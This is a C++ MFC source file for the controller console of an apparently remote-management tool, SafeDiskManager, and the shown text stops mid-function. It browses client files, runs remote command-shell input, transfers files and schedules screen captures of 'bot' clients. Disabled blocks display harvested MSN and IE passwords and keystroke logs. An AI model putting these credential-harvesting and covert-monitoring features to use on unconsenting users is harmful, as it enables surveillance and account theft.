
// ChildFrm.cpp : CChildFrame 类的实现
//

#include "stdafx.h"
#include "SafeDiskManager.h"
#include "ChildFrm.h"
#include "MainFrm.h"
#include "SafeDiskManagerView.h"
#include "ProtoManager.h"
#include "ProtoManagerChild.h"
#include "GlobalUtils.h"
#include "../Public/View/ViewListCtrl.h"
#include "GlobalUtils.h"
#include <algorithm>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CChildFrame

IMPLEMENT_DYNCREATE(CChildFrame, CMDIChildWndEx)

BEGIN_MESSAGE_MAP(CChildFrame, CMDIChildWndEx)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_CONTEXTMENU()
//	ON_UPDATE_COMMAND_UI(ID_CHILD_REFRESH, &CChildFrame::OnUpdateChildRefresh)
//	ON_COMMAND(ID_CHILD_REFRESH, &CChildFrame::OnChildRefresh)
	ON_WM_MDIACTIVATE()
//	ON_COMMAND(ID_CHILD_DOWNLOAD, &CChildFrame::OnChildDownload)
//	ON_UPDATE_COMMAND_UI(ID_CHILD_DOWNLOAD, &CChildFrame::OnUpdateChildDownload)
//	ON_COMMAND(ID_CHILD_UPLOAD, &CChildFrame::OnChildUpload)
//	ON_UPDATE_COMMAND_UI(ID_CHILD_UPLOAD, &CChildFrame::OnUpdateChildUpload)
	ON_WM_TIMER()
	ON_WM_SIZE()
	ON_WM_WINDOWPOSCHANGING()
	ON_WM_WINDOWPOSCHANGED()
END_MESSAGE_MAP()

// CChildFrame 构造/析构

CChildFrame::CChildFrame()
{
	m_dwClientId = 0;
	m_dwCursor = 0;

	m_iRemoteSelLevel = 0;
}

CChildFrame::~CChildFrame()
{
}

BOOL CChildFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	//cs.style &= ~WS_BORDER;
	cs.dwExStyle &=~ WS_EX_CLIENTEDGE;

//	cs.dwExStyle &= ~(WS_EX_CLIENTEDGE | WS_EX_WINDOWEDGE | WS_EX_STATICEDGE);
//	cs.style &= ~(WS_THICKFRAME | WS_CAPTION | WS_BORDER | WS_SYSMENU);
//	cs.style = WS_CHILD | WS_VISIBLE;

	cs.style |= WS_VISIBLE | WS_MAXIMIZE;

	if( !CMDIChildWndEx::PreCreateWindow(cs) )
		return FALSE;

	return TRUE;
}

// CChildFrame 诊断

#ifdef _DEBUG
void CChildFrame::AssertValid() const
{
	CMDIChildWndEx::AssertValid();
}

void CChildFrame::Dump(CDumpContext& dc) const
{
	CMDIChildWndEx::Dump(dc);
}
#endif //_DEBUG

// CChildFrame 消息处理程序

BOOL CChildFrame::CanShowOnMDITabs()
{
//	return FALSE;
	return TRUE;
}

int CChildFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CMDIChildWndEx::OnCreate(lpCreateStruct) == -1)
		return -1;

	// 
	// Create View Window
	//
	BOOL bNameValid;
	CString strName;
	bNameValid = strName.LoadString(IDS_CHILD_NAME);
	if (!m_wndChild.Create(strName, this, 
		CRect(0, 0, 250, 250), 
		FALSE,
		ID_VIEW_OUTPUTWND,
		WS_CHILD|WS_VISIBLE|WS_CLIPSIBLINGS|WS_CLIPCHILDREN|CBRS_LEFT|CBRS_FLOAT_MULTI))
	{
		TRACE0("Failed to create Output window\n");
		return FALSE; // failed to create
	}
	
//	m_wndChild.EnableDocking(CBRS_ALIGN_ANY);
	m_wndChild.DockToFrameWindow(CBRS_ALIGN_TOP);
	DockPane(&m_wndChild);
	
	//CSize minSize(100, 1000);
	//m_wndChild.SetMinSize(minSize);
	m_wndChild.SetMinSize(CSize(250, 250));
	HDWP hdwp;
	m_wndChild.MovePane(CRect(0, 0, 250, 250), TRUE, hdwp);
	ActiveTab(GetMainFrame()->m_iCurrentTab);

//	CCustomHeightMFCTabCtrl *pCtrl = (CCustomHeightMFCTabCtrl *)m_pRelatedTabGroup;
//	pCtrl->ResetHeight();

	// Dir

	// Cmd
	m_wndChild.m_wndCmd.SetEditCallBack(this);

	// Version
	m_wndChild.m_wndVersion.InsertColumn(0, _T("名称"),			LVCFMT_LEFT, 200);
	m_wndChild.m_wndVersion.InsertColumn(1, _T("信息"),			LVCFMT_LEFT, 400);

	// Password
	//m_wndChild.m_wndPassword.InsertColumn(0, _T("类型"),		LVCFMT_LEFT, 150);
	//m_wndChild.m_wndPassword.InsertColumn(1, _T("用户名"),		LVCFMT_LEFT, 150);
	//m_wndChild.m_wndPassword.InsertColumn(2, _T("密码"),		LVCFMT_LEFT, 150);
	//m_wndChild.m_wndPassword.InsertColumn(3, _T("域"),			LVCFMT_LEFT, 150);

	// Process
	m_wndChild.m_wndProcess.InsertColumn(0, _T("进程名"),		LVCFMT_LEFT, 200);
	m_wndChild.m_wndProcess.InsertColumn(1, _T("PID"),			LVCFMT_LEFT, 100);

	// Service
	m_wndChild.m_wndService.InsertColumn(0, _T("名称"),			LVCFMT_LEFT, 300);
	m_wndChild.m_wndService.InsertColumn(1, _T("显示名称"),		LVCFMT_LEFT, 300);

	/*
	// Keyboard
	m_wndChild.m_wndKeyboard.InsertColumn(0, _T("窗口名称"),	LVCFMT_LEFT, 150);
	m_wndChild.m_wndKeyboard.InsertColumn(1, _T("进程名"),		LVCFMT_LEFT, 150);
	m_wndChild.m_wndKeyboard.InsertColumn(2, _T("PID"),			LVCFMT_LEFT, 150);
	m_wndChild.m_wndKeyboard.InsertColumn(3, _T("内容"),		LVCFMT_LEFT, 300);
	*/

	// Network
	m_wndChild.m_wndNetwork.InsertColumn(0, _T("进程名"),		LVCFMT_LEFT, 150);
	m_wndChild.m_wndNetwork.InsertColumn(1, _T("PID"),			LVCFMT_LEFT, 100);
	m_wndChild.m_wndNetwork.InsertColumn(2, _T("协议"),			LVCFMT_LEFT, 100);
	m_wndChild.m_wndNetwork.InsertColumn(3, _T("本机IP:端口"),	LVCFMT_LEFT, 150);
	m_wndChild.m_wndNetwork.InsertColumn(4, _T("远程IP:端口"),	LVCFMT_LEFT, 150);
	m_wndChild.m_wndNetwork.InsertColumn(5, _T("状态"),			LVCFMT_LEFT, 150);

	m_wndChild.m_wndControlPanel.UpdateList();
	

	m_bAutoScreenTimerStarted = FALSE;

	return 0;
}

void CChildFrame::OnMDIActivate(BOOL bActivate, CWnd* pActivateWnd, CWnd* pDeactivateWnd)
{
	//
	CMDIChildWndEx::OnMDIActivate(bActivate, pActivateWnd, pDeactivateWnd);
	
	if (bActivate)
	{
		// Set Pane Text
		CString strPath;
		strPath.LoadString(ID_INDICATOR_PATH);
		strPath += m_szCurDir;
		GetMainFrame()->m_wndStatusBar.SetPaneText(INDEX_STATUS_PANE_PATH, strPath);

		// Update Time
		HTREEITEM hRoot = GetMainFrame()->GetConnectTree().GetRootItem();
		HTREEITEM hChild = GetMainFrame()->GetConnectTree().GetChildItem(hRoot);
		while(hChild)
		{
			DWORD dwId = GetMainFrame()->GetConnectTree().GetItemData(hChild);
			if (dwId == m_dwClientId)
			{
				GetMainFrame()->GetConnectTree().SelectItem(hChild);

				GetMainFrame()->OnConnectSelChanged(GetMainFrame()->GetConnectTree().GetSelectedItem());
				//if (GetFileList())
				{
					OnFileViewSelChanged(m_wndChild.m_wndFile.GetNextItem(-1, LVIS_SELECTED));
				}
				break;
			}
			hChild = GetMainFrame()->GetConnectTree().GetNextSiblingItem(hChild);
		}
	}
}

VOID CChildFrame::Initialize(DWORD dwId, CString strPassword, UINT uTime, DWORD dwIdleTime, BOOL bWhiteMode)
{
	// Set Id
	m_dwClientId = dwId;
	GetMainFrame()->Lock();
	GetMainFrame()->m_ChildMap[m_dwClientId] = this;
	GetMainFrame()->UnLock();

	m_wndChild.m_wndLock.SetLockInfo(strPassword, dwIdleTime);
	m_wndChild.m_wndScreen.SetAutoTime(uTime);
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter != theConfig.m_mapClient.end())
	{
		for (int i = 0; i < (int)pIter->second.iWinCount; i++)
		{
			m_wndChild.m_wndBlackWhiteList.m_vecWin.push_back(pIter->second.vecWin[i]);
			m_wndChild.m_wndBlackWhiteList.m_vecClass.push_back(pIter->second.vecClass[i]);
		}
		for (int i = 0; i < (int)pIter->second.iWhiteWinCount; i++)
		{
			m_wndChild.m_wndBlackWhiteList.m_vecWhiteWin.push_back(pIter->second.vecWhiteWin[i]);
			m_wndChild.m_wndBlackWhiteList.m_vecWhiteClass.push_back(pIter->second.vecWhiteClass[i]);
		}
		m_wndChild.m_wndBlackWhiteList.m_bWhiteMode = bWhiteMode;
		m_wndChild.m_wndBlackWhiteList.UpdateList();
	}
	
	//
	theProtoManager->InvokeDir(m_dwClientId, _T("*"));
	theProtoManager->InvokeCmd(m_dwClientId, _T("*"));
	theProtoManager->InvokeVersion(m_dwClientId);
	theProtoManager->InvokePassword(m_dwClientId);
	theProtoManager->InvokeProcess(m_dwClientId);
	theProtoManager->InvokeService(m_dwClientId);
	theProtoManager->InvokeNetwork(m_dwClientId);

	// Set Status Text
	CString strPath;
	strPath.LoadString(ID_INDICATOR_PATH);
	strPath += _T("*");
	GetMainFrame()->m_wndStatusBar.SetPaneText(INDEX_STATUS_PANE_PATH, strPath);

	if (0 != uTime)
	{
		m_bAutoScreenTimerStarted = TRUE;
		SetTimer(100, uTime * 1000 * 60, NULL);
	}

	pIter = theConfig.m_mapClient.find(m_dwClientId);
#if 0
	if (pIter == theConfig.m_mapClient.end())
	{
		_CLIENT_INFO Info;
		Info.configInfo.LoadIni(theApp.m_strConfigPath);
		theConfig.m_mapClient.insert(std::map<DWORD, _CLIENT_INFO>::value_type(m_dwClientId, Info));
		theConfig.Save();
		pIter = theConfig.m_mapClient.find(m_dwClientId);
	}
	m_wndChild.m_wndControlDev.m_Config = pIter->second.configInfo;
	m_wndChild.m_wndControlDev.UpdateDisplay();
	m_wndChild.m_wndControlStorage.m_Config = pIter->second.configInfo;
	m_wndChild.m_wndControlStorage.UpdateDisplay();
	m_wndChild.m_wndControlSystem.m_Config = pIter->second.configInfo;
	m_wndChild.m_wndControlSystem.UpdateDisplay();
#else
	if (pIter != theConfig.m_mapClient.end())
	{
		m_wndChild.m_wndControlDev.m_Config = pIter->second.configInfo;
		m_wndChild.m_wndControlDev.UpdateDisplay();
		m_wndChild.m_wndControlStorage.m_Config = pIter->second.configInfo;
		m_wndChild.m_wndControlStorage.UpdateDisplay();
		m_wndChild.m_wndControlSystem.m_Config = pIter->second.configInfo;
		m_wndChild.m_wndControlSystem.UpdateDisplay();
	}
#endif
}

void CChildFrame::OnClose()
{
	GetMainFrame()->Lock();
	GetMainFrame()->m_ChildMap[m_dwClientId] = NULL;
	GetMainFrame()->UnLock();

	m_wndChild.Close();
	CMDIChildWndEx::OnClose();
}

//////////////////////////////////////////////////////////////////////////

/*
CSafeDiskManagerView* CChildFrame::GetFileView()
{
	return (CSafeDiskManagerView*)(GetActiveView());
}

CListCtrl& CChildFrame::GetFileList()
{
	return m_wndChild.m_wndFile;
}
*/

VOID CChildFrame::OnDir(Packet_t &Packet)
{
	int iImageCount = m_wndChild.m_wndFile.m_ImageList.GetImageCount();
	for(int i = iImageCount - 1 ; i >= 0; i--)
	{
		m_wndChild.m_wndFile.m_ImageList.Remove(i);
	}
	m_vecItemInfo.clear();

	//
	m_wndChild.m_wndFile.SetRedraw(FALSE);
	m_wndChild.m_wndFile.LockWindowUpdate();
	LPCTSTR pPointerBase = Packet.strResponse;
	LPCTSTR pPointer = pPointerBase + 1;
	BOOL bRoot = (*pPointerBase == _T('0'));
	if (bRoot)
	{
		INT iCount = (Packet.strResponse.GetLength() - 1) / 3;
		for(int i = 0; i < iCount; i++)
		{
			TCHAR szBuf[32] = {0};
			lstrcpyn(szBuf, pPointer + i * 3, 4);
			HICON hTempIcon = CGlobalUtility::GetIconFromFileExt(szBuf, TRUE);
			m_wndChild.m_wndFile.m_ImageList.Add(hTempIcon);

			LVITEM	lvi;
			lvi.mask = LVIF_IMAGE|LVIF_TEXT;
			lvi.iItem	= i;
			lvi.iSubItem= 0;
			lvi.iImage	= i;
			lvi.pszText	= szBuf;

			m_wndChild.m_wndFile.InsertItem(&lvi);
			m_wndChild.m_wndFile.SetItemData(i, TRUE);
		}
	}
	else
	{
		//
		DWORD dwFileAddPos = 0;

		// Add Back Button
		LVITEM	lvi;
		lvi.mask = LVIF_IMAGE|LVIF_TEXT;
		lvi.iItem	= dwFileAddPos;
		lvi.iSubItem= 0;
		lvi.iImage	= dwFileAddPos;
		lvi.pszText	= _T("..");
		m_wndChild.m_wndFile.InsertItem(&lvi);
		m_wndChild.m_wndFile.SetItemData(dwFileAddPos, TRUE);
		HICON hTempIcon = CGlobalUtility::GetIconFromFileExt(_T(""), TRUE);
		m_wndChild.m_wndFile.m_ImageList.Add(hTempIcon);
		dwFileAddPos++;

		ITEMINFO ItemInfo = {0};
		m_vecItemInfo.push_back(ItemInfo);

		USES_CONVERSION;
		CString szReceive = pPointer;
		INT iFindCur = 0;
		INT iFindNext= 0;
		while(1)
		{
			if(iFindNext >= szReceive.GetLength())
			{
				break;
			}

			// Flag
			iFindNext = szReceive.Find(_T('\"'), iFindNext);
			if(iFindNext == -1)
			{
				break;
			}

			CString szSplitBuffer = szReceive.Mid(iFindCur, iFindNext - iFindCur);
			iFindNext += 1;
			iFindCur = iFindNext;

			// Path
			iFindNext = szReceive.Find(_T('|'), iFindNext);
			if(iFindNext == -1)
			{
				break;
			}
			CString szSplitPath = szReceive.Mid(iFindCur, iFindNext - iFindCur);
			iFindNext += 1;
			iFindCur = iFindNext;


			ITEMINFO ItemInfo;
			// Directory
			ItemInfo.bDirectory = (CGlobalUtility::MakeByte(szSplitBuffer.Mid(0, 2)) != 0);
			// Low File Size
			ItemInfo.nFileSizeLow = CGlobalUtility::MakeDWord(szSplitBuffer.Mid(2, 8));
			// High File Size
			ItemInfo.nFileSizeHigh= CGlobalUtility::MakeDWord(szSplitBuffer.Mid(10, 8));
			// File Low
			ItemInfo.ftCreationTime.dwLowDateTime = CGlobalUtility::MakeDWord(szSplitBuffer.Mid(18, 8));
			// File High
			ItemInfo.ftCreationTime.dwHighDateTime = CGlobalUtility::MakeDWord(szSplitBuffer.Mid(26, 8));
			// Text
			ItemInfo.strItem = szSplitPath;
			m_vecItemInfo.push_back(ItemInfo);

			// Process
			HICON hIcon = CGlobalUtility::GetIconFromFileExt(szSplitPath, ItemInfo.bDirectory);
			m_wndChild.m_wndFile.m_ImageList.Add(hIcon);

			LVITEM	lvi;
			lvi.mask = LVIF_IMAGE|LVIF_TEXT;
			lvi.iItem	= dwFileAddPos;
			lvi.iSubItem= 0;
			lvi.iImage	= dwFileAddPos;
			lvi.pszText	= (LPTSTR)(LPCTSTR)szSplitPath;

			m_wndChild.m_wndFile.InsertItem(&lvi);
			if(ItemInfo.bDirectory)
			{
				m_wndChild.m_wndFile.SetItemData(dwFileAddPos, TRUE);
			}
			else
			{
				m_wndChild.m_wndFile.SetItemData(dwFileAddPos, FALSE);
			}
			dwFileAddPos++;
		}
	}
	

	/*
	// Convert Data
	pRealData[m_dwDataLen] = 0;
	DWORD dwSize = 0;
	LPTSTR pString = CGlobalUtility::OemToChar((LPCSTR)pRealData, &dwSize);

	INT iCount = m_dwDataLen / 3;
	LPCTSTR pPointer = pString;
	for(int i = 0; i < iCount; i++)
	{
		TCHAR szBuf[32] = {0};
		lstrcpyn(szBuf, pPointer + i * 3, 4);
		HICON hTempIcon = CGlobalUtility::GetIconFromFileExt(szBuf, TRUE);
		GetFileView()->GetImageList()->Add(hTempIcon);

		LVITEM	lvi;
		lvi.mask = LVIF_IMAGE|LVIF_TEXT;
		lvi.iItem	= i;
		lvi.iSubItem= 0;
		lvi.iImage	= i;
		lvi.pszText	= szBuf;

		GetFileList().InsertItem(&lvi);
		GetFileList().SetItemData(i, TRUE);
	}

	m_iRemoteSelLevel = 0;
	m_szRemoteCurDir  = _T("");

	// Free
	SAFE_DELETE_AR(pString);
	*/

	m_wndChild.m_wndFile.UnlockWindowUpdate();
	m_wndChild.m_wndFile.SetRedraw(TRUE);
}

void CChildFrame::OnFileViewDblClick(INT iClickIndex)
{
	if(iClickIndex == -1)
	{
		return;
	}

	// This is a Directory
	if (m_wndChild.m_wndFile.GetItemData(iClickIndex) == 0)
	{
		return;
	}

	//
	CString szFileName = m_wndChild.m_wndFile.GetItemText(iClickIndex, 0);

	//
	if(m_iRemoteSelLevel == 0)
	{
		m_iRemoteSelLevel++;
		m_szCurDir = _T("");
		m_szCurDir += szFileName;
	}
	else
	{
		if(iClickIndex == 0)
		{
			m_iRemoteSelLevel--;
			m_szCurDir = m_szCurDir.Left(m_szCurDir.GetLength() - 1);
			m_szCurDir = m_szCurDir.Left(m_szCurDir.ReverseFind('\\') + 1);
		}
		else
		{
			m_iRemoteSelLevel++;
			m_szCurDir += szFileName;
			if(m_szCurDir.Right(1) != _T('\\'))
			{
				m_szCurDir += _T("\\");
			}
		}
	}

	m_wndChild.m_wndFile.DeleteAllItems();

	LPCTSTR pDir = (0 == m_iRemoteSelLevel ? _T("*") : m_szCurDir);
	theProtoManager->InvokeDir(m_dwClientId, pDir);

	// Update Status Bar
	CString strPath;
	strPath.LoadString(ID_INDICATOR_PATH);
	strPath += pDir;
	GetMainFrame()->m_wndStatusBar.SetPaneText(INDEX_STATUS_PANE_PATH, strPath);
}

void CChildFrame::OnFileViewSelChanged(int iClickIndex)
{
	// Update Status Bar
	// Size
	CString strSize;
	strSize.LoadString(ID_INDICATOR_SIZE);
	if(iClickIndex == -1)
	{
	}
	else
	{
		if(m_vecItemInfo.size() <= (UINT)iClickIndex)
		{
			return;
		}

		//if(m_vecItemInfo[iClickIndex].bDirectory)
		if (0)
		{
			strSize += _T("0");
		}
		else
		{
			TCHAR szDesc[MAX_PATH] = {0};
			TCHAR szDigSize[MAX_PATH] = {0};

			TCHAR szTemp[MAX_PATH] = {0};
			/*
			wsprintf(szTemp, _T("%s(%s)"), 
				CGlobalUtility::FileSizeToString(m_vecItemInfo[iClickIndex].nFileSizeLow, szDesc),
				CGlobalUtility::BigNumToString(m_vecItemInfo[iClickIndex].nFileSizeLow, szDigSize));
			*/
			wsprintf(szTemp, _T("%s"), 
				CGlobalUtility::FileSizeToString(m_vecItemInfo[iClickIndex].nFileSizeLow, szDesc));
			strSize += szTemp;
		}
	}
	GetMainFrame()->m_wndStatusBar.SetPaneText(INDEX_STATUS_PANE_SIZE, strSize);
}

void CChildFrame::OnContextMenu(CWnd* /*pWnd*/, CPoint point)
{
//	theApp.GetContextMenuManager()->ShowPopupMenu(IDR_MENU_CHILD, point.x, point.y, this, TRUE);
}

void CChildFrame::OnUpdateChildRefresh(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(TRUE);
}

void CChildFrame::OnChildRefresh()
{
	m_wndChild.m_wndFile.DeleteAllItems();

	LPCTSTR pDir = (0 == m_iRemoteSelLevel ? _T("*") : m_szCurDir);
	theProtoManager->InvokeDir(m_dwClientId, pDir);
}

//////////////////////////////////////////////////////////////////////////

VOID CChildFrame::OnCmd( Packet_t &Packet )
{
	//
	CRichEditCtrl& RichEdit = m_wndChild.m_wndCmd;
	RichEdit.SetSel(-1, -1);				        // end of edit text
	RichEdit.ReplaceSel(Packet.strResponse);		// append string..
	RichEdit.SendMessage(EM_SCROLLCARET);	        // ..and show caret

	CHARRANGE cr;
	RichEdit.GetSel(cr);
	m_dwCursor = cr.cpMin;
}

void CChildFrame::OnEnMsgfilter( NMHDR *pNMHDR, LRESULT *pResult )
{
	MSGFILTER *pMsgFilter = reinterpret_cast<MSGFILTER *>(pNMHDR);
	
	// TODO:  The control will not send this notification unless you override the
	// CRichEditCtrl::OnInitDialog() function to send the EM_SETEVENTMASK message
	// to the control with either the ENM_KEYEVENTS or ENM_MOUSEEVENTS flag 
	// ORed into the lParam mask.

	CRichEditCtrl& RichEdit = m_wndChild.m_wndCmd; 
	if(pNMHDR->code != EN_MSGFILTER || pNMHDR->hwndFrom != RichEdit.GetSafeHwnd())
	{
		*pResult = 0;
		return;
	}

	if(pMsgFilter->msg == WM_CHAR)
	{
		SHORT iCode = pMsgFilter->wParam; 
		if((iCode >> 8) == 0 && isprint(iCode))
		{
			TCHAR szBuf[32];
			wsprintf(szBuf, _T("%C"), pMsgFilter->wParam);

			RichEdit.SetSel(-1, -1);
			// Append String
			RichEdit.ReplaceSel(szBuf);					
			RichEdit.SendMessage(EM_SCROLLCARET);
			//
			pMsgFilter->wParam = 0;
		}
		else if(pMsgFilter->wParam == VK_RETURN)
		{
			WCHAR szBufferW[MAX_PATH] = {0};
			CHARRANGE crBefore;
			RichEdit.GetSel(crBefore);

			TEXTRANGEW textRange;
			textRange.chrg.cpMin = m_dwCursor;
			textRange.chrg.cpMax = crBefore.cpMin + 1;
			textRange.lpstrText	 = szBufferW;
			int nLength = (int)::SendMessage(RichEdit.GetSafeHwnd(), EM_GETTEXTRANGE, 0, (LPARAM)&textRange);

			//
			USES_CONVERSION;
			LPTSTR pszBuffer = W2T(szBufferW);
			size_t strSize = lstrlen(pszBuffer);
			if(pszBuffer[strSize - 1] != _T('\r'))
			{
				LPTSTR lpNewBuffer = new TCHAR[strSize + 2];
				lstrcpy(lpNewBuffer, pszBuffer);
				lpNewBuffer[strSize] = _T('\r');
				lpNewBuffer[strSize + 1] = 0;

			//	delete[] pszBuffer;
			//	pszBuffer = NULL;

				pszBuffer = lpNewBuffer;
			}
			if(lstrcmpi(pszBuffer, _T("exit\r")) != 0)
			{
				theProtoManager->InvokeCmd(m_dwClientId, pszBuffer);
			}

			//
			CHARRANGE crAfter;
			RichEdit.GetSel(crAfter);
			m_dwCursor = crAfter.cpMin;

			//
			pMsgFilter->wParam = 0;
		}
	}
	else if(pMsgFilter->msg == WM_KEYDOWN)
	{
		CHARRANGE cr;
		RichEdit.GetSel(cr);
		if(pMsgFilter->wParam == VK_BACK)
		{
			if(cr.cpMin <= m_dwCursor)
			{
				pMsgFilter->wParam = 0;
			}
		}
		else if(pMsgFilter->wParam == VK_DELETE)
		{
			if(cr.cpMin < m_dwCursor)
			{
				pMsgFilter->wParam = 0;
			}
		}
		else if(pMsgFilter->wParam == VK_ESCAPE)
		{
			pMsgFilter->wParam = 0;
		}
	}
	*pResult = 0;
}

//////////////////////////////////////////////////////////////////////////

VOID CChildFrame::OnVersion(Packet_t &Packet)
{
	LPCTSTR pPointer = Packet.strResponse;

	CViewListCtrl& VersionList = m_wndChild.m_wndVersion;
	VersionList.DeleteAllItems();

	//
	tstring strVersion = pPointer;
	size_t iCur = 0;
	size_t iNext = 0;
	BOOL bFirst = TRUE;
	while(1)
	{	
		// Like this
		// Windows;Windows 7 Ultimate Windows 7 Ultimate (Build 7601)|
		iNext = strVersion.find('|', iCur);
		if(iNext == -1)
		{
			break;
		}
		tstring strInsert = strVersion.substr(iCur, iNext - iCur);

		//
		size_t iNextTab			= strVersion.find('\"', iCur);
		tstring strName			= strVersion.substr(iCur, iNextTab - iCur);
		tstring strInformation	= strVersion.substr(iNextTab + 1, iNext - iNextTab - 1);

		if (strName.size() && strInformation.size())
		{
			if(IsWindow(VersionList.m_hWnd))
			{
				int iIndex = VersionList.InsertItem(VersionList.GetItemCount(), _T(""));
				VersionList.SetItemText(iIndex, 0, strName.c_str());
				VersionList.SetItemText(iIndex, 1, strInformation.c_str());
			}
		}
		iCur = iNext + 1;
		iNext = iCur;
	}
	VersionList.SendMessage(WM_VSCROLL, SB_BOTTOM, 0);
}

#if 0
VOID CChildFrame::OnPassword( Packet_t &Packet )
{
	LPCTSTR pPointerBase = Packet.strResponse;
	LPCTSTR pPointer = pPointerBase + 1;
	//
	Utils::CViewListCtrl& PasswordList = m_wndChild.m_wndPassword;
	PasswordList.DeleteAllItems();

	if (*pPointerBase != _T('*'))
		return;	

	tstring strInfo = pPointer;
	size_t iCur = 0;
	size_t iNext = 0;
	BOOL bFirst = TRUE;
	while(1)
	{	
		iNext = strInfo.find('|', iCur);
		if(iNext == -1)
		{
			break;
		}
		
		//
		size_t iNextTab;
		tstring strType		= strInfo.substr(iCur, (iNextTab = strInfo.find(';', iCur)) - iCur);
		int iType = _tstoi(strType.c_str());
		strType = _T("");
		iCur = iNextTab + 1;
		tstring strUser     = strInfo.substr(iCur, (iNextTab = strInfo.find(';', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strPassword = strInfo.substr(iCur, (iNextTab = strInfo.find(';', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strField    = strInfo.substr(iCur, (iNextTab = strInfo.find(';', iCur)) - iCur);

		int iIndex = PasswordList.InsertItem(PasswordList.GetItemCount(), _T(""));
		// MSN
		if (0 == iType)
		{
			strType = _T("MSN");
		}
		// IE
		else if (1 == iType)
		{
			strType = _T("IE");
		}
		PasswordList.SetItemText(iIndex, 0, strType.c_str());
		PasswordList.SetItemText(iIndex, 1, strUser.c_str());
		PasswordList.SetItemText(iIndex, 2, strPassword.c_str());
		PasswordList.SetItemText(iIndex, 3, strField.c_str());
		PasswordList.SendMessage(WM_VSCROLL, SB_BOTTOM, 0);

		iCur = iNext + 1;
		iNext = iCur;
	}


#if 0
	USES_CONVERSION;
	LONG dwRet = CGlobalUtility::CheckMSNPassword(
		T2A(strUser.c_str()), T2A(strPassword.c_str()));
	if (TRUE == dwRet)
	{
		int i = 0;
	}
#endif
}
#endif

void CChildFrame::OnChildDownload()
{
	INT iIndex = m_wndChild.m_wndFile.GetNextItem(-1, LVIS_SELECTED);
	if (iIndex != -1 &&
		iIndex != 0 &&
		m_vecItemInfo[iIndex].bDirectory != TRUE)
	{
		CString strItem = m_vecItemInfo[iIndex].strItem;
		File_Transfer_t file;
		file.strLocalPath = _T("");
		file.strLocalName = strItem;
		file.strRemoteDir = m_szCurDir;
		file.dwClientId = m_dwClientId;
		file.bToRemote = FALSE;
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (pChild)
			pChild->InvokeFile(file);
	}
}

void CChildFrame::OnUpdateChildDownload(CCmdUI *pCmdUI)
{
	BOOL bEnable = FALSE;
	if (theRelayUpDownInfo.bUpdated &&
		theRelayUpDownInfo.bFileTrans &&
		m_iRemoteSelLevel != 0)
	{
		INT iIndex = m_wndChild.m_wndFile.GetNextItem(-1, LVIS_SELECTED);
		if (iIndex != -1 &&
			iIndex != 0 &&
			m_vecItemInfo[iIndex].bDirectory != TRUE)
		{
			bEnable = TRUE;
		}
	}
	
	pCmdUI->Enable(bEnable);
}

void CChildFrame::OnChildUpload()
{
	// UpLoad
	CFileDialog dlg(TRUE, NULL, NULL, OFN_ALLOWMULTISELECT,
		_T("All Files (*.*)|*.*||"));
	if(dlg.DoModal() == IDOK)
	{
		POSITION Position = dlg.GetStartPosition();
		while(Position != NULL)
		{
			CString strPath = dlg.GetNextPathName(Position);
			CString strFileName = strPath.Right(strPath.GetLength() - strPath.ReverseFind(_T('\\')) - 1);
			
			File_Transfer_t file;
			file.strLocalPath = strPath;
			file.strLocalName = strFileName;
			file.strRemoteDir = m_szCurDir;
			file.dwClientId = m_dwClientId;
			file.bToRemote = TRUE;
			CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
			if (pChild)
			{
				pChild->InvokeFile(file);
				GetMainFrame()->m_vecClientIdsToRefreshFileLock.Lock();
				GetMainFrame()->m_vecClientIdsToRefreshFile.push_back(m_dwClientId);
				GetMainFrame()->m_vecClientIdsToRefreshFileLock.Unlock();
			}
		}
	}
}

void CChildFrame::OnUpdateChildUpload(CCmdUI *pCmdUI)
{
	BOOL bEnable = FALSE;
	if (theRelayUpDownInfo.bUpdated &&
		theRelayUpDownInfo.bFileTrans &&
		m_iRemoteSelLevel != 0)
	{
		bEnable = TRUE;
	}

	pCmdUI->Enable(bEnable);
}

VOID CChildFrame::CaptureScreen()
{
//	AfxMessageBox(_T("CChildFrame::CaptureScreen"), MB_ICONINFORMATION);
	GetMainFrame()->OutputMessage(ICON_TYPE_INFO, _T("开始截屏..."));
	CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_SCREEN);
	}
}

VOID CChildFrame::OnControlSetScreenTime(UINT uTime)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter == theConfig.m_mapClient.end())
	{
		_CLIENT_INFO info;
		info.uScreenTime = uTime;
		theConfig.m_mapClient.insert(std::map<DWORD, _CLIENT_INFO>::value_type(m_dwClientId, info));
		theConfig.Save();
		pIter = theConfig.m_mapClient.find(m_dwClientId);
	}
	else
	{
		pIter->second.uScreenTime = uTime;
		theConfig.Save();
	}

// 	LPSTR pBuf = Crypt::_base64Encode((LPBYTE)&info, sizeof(info), NULL);
// 	USES_CONVERSION;
// 	CString strBuf = A2T(pBuf);
// 	free(pBuf);

	//std::string strJsonConfig;
	//pIter->second.SaveConfig(strJsonConfig);
	//CString strBuf = CA2T(strJsonConfig.c_str()).m_psz;
	//theProtoManager->InvokeClientLockInfo(m_dwClientId, strBuf);

	if (0 != uTime)
	{
		if (!m_bAutoScreenTimerStarted)
		{
			m_bAutoScreenTimerStarted = TRUE;
			SetTimer(100, uTime * 1000 * 60, NULL);
		}
	}
	else
	{
		m_bAutoScreenTimerStarted = FALSE;
		KillTimer(100);
	}

	AfxMessageBox(_T("设置成功!"), MB_ICONINFORMATION);
}

VOID CChildFrame::ScreenRealtimeView()
{
	std::vector<ClientInfo_t> vecInfo = theProtoManager->GetResClient();
	ClientInfo_t *pInfo = NULL;
	for (int i = 0; i < (int)vecInfo.size(); i++)
	{
		if (vecInfo[i].dwClientId == m_dwClientId)
		{
			pInfo = &vecInfo[i];
			break;
		}
	}
	if (NULL == pInfo)
	{
		AfxMessageBox(_T("无法获得信息！"), MB_ICONERROR);
